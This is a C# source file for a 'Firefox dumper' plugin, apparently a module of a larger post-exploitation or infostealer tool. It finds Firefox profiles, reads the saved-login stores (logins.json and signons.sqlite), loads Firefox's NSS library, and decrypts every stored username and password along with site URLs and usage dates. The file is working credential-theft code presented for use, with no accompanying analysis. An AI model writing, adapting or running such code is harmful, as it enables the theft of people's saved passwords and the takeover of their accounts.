using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Plugin48Dumper
{
    public class clsFirefoxDumper : clsDumper
    {
        public string BrowserName { get { return "Firefox"; } }

        public clsFirefoxDumper()
        {
            Entry = "firefox";
            Description = "Firefox dumper";
            Usage = "firefox <action>";
        }

        public List<clsCredential> fnDumpCredential(int nCount, string szRegex)
        {
            string signonsFile = null;
            string loginsFile = null;
            bool signonsFound = false;
            bool loginsFound = false;
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<clsCredential>();
            if (dirs.Length == 0)
                return logins;

            foreach (string dir in dirs)
            {
                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                // find &quot;logins.json"file
                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    clsFFDecryptor.NSS_Init(dir);
                    break;
                }

            }

            if (signonsFound)
            {
                using (var conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
                {
                    conn.Open();
                    using (var command = conn.CreateCommand())
                    {
                        command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname , timeCreated, timeLastUsed, timePasswordChanged, timesUsed FROM moz_logins";
                        using (var reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string username = clsFFDecryptor.Decrypt(reader.GetString(0));
                                string password = clsFFDecryptor.Decrypt(reader.GetString(1));

                                logins.Add(new clsCredential
                                {
                                    Username = username,
                                    Password = password,
                                    Url = reader.GetString(2),
                                    Create_Date = reader.GetString(3),
                                    Last_Used_Date = reader.GetString(4),
                                    Pass_Time_Chage = reader.GetString(5),
                                    Pass_Times_Used = reader.GetString(6)
                                });
                            }
                        }
                    }
                    conn.Close();
                }

            }

            if (loginsFound)
            {
                FFLogins ffLoginData;
                using (StreamReader sr = new StreamReader(loginsFile))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
                }

                foreach (LoginData loginData in ffLoginData.logins)
                {
                    string username = clsFFDecryptor.Decrypt(loginData.encryptedUsername);
                    string password = clsFFDecryptor.Decrypt(loginData.encryptedPassword);
                    logins.Add(new clsCredential
                    {
                        Username = username,
                        Password = password,
                        Url = loginData.hostname,
                        Create_Date = loginData.timeCreated.ToString(),
                        Last_Used_Date = loginData.timeLastUsed.ToString(),
                        Pass_Time_Chage = loginData.timePasswordChanged.ToString(),
                        Pass_Times_Used = loginData.timesUsed.ToString()
                    });
                }
            }
            return logins;
        }

        public class clsCredential
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Create_Date { get; set; }
            public string Last_Used_Date { get; set; }
            public string Pass_Time_Chage { get; set; }
            public string Pass_Times_Used { get; set; }
        }

        class FFLogins
        {
            public long nextId { get; set; }
            public LoginData[] logins { get; set; }
            public string[] disabledHosts { get; set; }
            public int version { get; set; }
        }

        class LoginData
        {
            public long id { get; set; }
            public string hostname { get; set; }
            public string url { get; set; }
            public string httprealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public long timesUsed { get; set; }
        }

        static class clsFFDecryptor
        {
            static IntPtr NSS3;

            [DllImport("kernel32.dll")]
            public static extern IntPtr LoadLibrary(string szDllFilePath);

            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate long DLLFunctionDelegate(string configdir);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
            public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
            {
                IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
                DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
                return dll(ref data, ref result, cx);
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct TSECItem
            {
                public int SECItemType;
                public IntPtr SECItemData;
                public int SECItemLen;
            }

            private const string ffFolderName = @"\Mozilla Firefox\";
            public static long NSS_Init(string configdir)
            {

                var mozillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + ffFolderName;
                if (!System.IO.Directory.Exists(mozillaPath))
                    mozillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + ffFolderName;
                if (!System.IO.Directory.Exists(mozillaPath))
                    throw new Exception("Firefox folder not found");

                LoadLibrary(mozillaPath + "mozglue.dll");
                NSS3 = LoadLibrary(mozillaPath + "nss3.dll");
                IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
                DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
                return dll(configdir);
            }

            public static string Decrypt(string cypherText)
            {
                IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
                StringBuilder sb = new StringBuilder(cypherText);

                try
                {
                    byte[] ffData = Convert.FromBase64String(cypherText);

                    ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                    Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                    TSECItem tSecDec = new TSECItem();
                    TSECItem item = new TSECItem();
                    item.SECItemType = 0;
                    item.SECItemData = ffDataUnmanagedPointer;
                    item.SECItemLen = ffData.Length;

                    if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                    {
                        if (tSecDec.SECItemLen != 0)
                        {
                            byte[] bvRet = new byte[tSecDec.SECItemLen];
                            Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                            return Encoding.ASCII.GetString(bvRet);
                        }
                    }
                }
                catch (Exception ex)
                {
                    return null;
                }
                finally
                {
                    if (ffDataUnmanagedPointer != IntPtr.Zero)
                    {
                        Marshal.FreeHGlobal(ffDataUnmanagedPointer);

                    }
                }

                return null;
            }
        }
    }
}
